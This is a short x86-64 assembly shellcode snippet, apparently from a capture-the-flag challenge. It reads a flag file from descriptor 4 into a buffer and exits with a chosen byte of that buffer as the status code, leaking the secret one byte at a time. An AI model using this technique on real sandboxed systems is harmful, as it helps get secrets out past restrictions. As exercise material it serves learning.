.global _start
_start:
.intel_syntax noprefix

# read(4, buf, 0x80);
mov rax, 0
mov rdi, 4
lea rsi, [rip+buf]
mov rdx, 0x80
syscall

# exit(*(buf + x));
mov rax, 60
xor rdi, rdi
xor rbx, rbx
mov bl, BYTE PTR [rip+buf+x]
mov rdi, rbx
syscall

flag:
.asciz "./flag"
buf:
.asciz "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
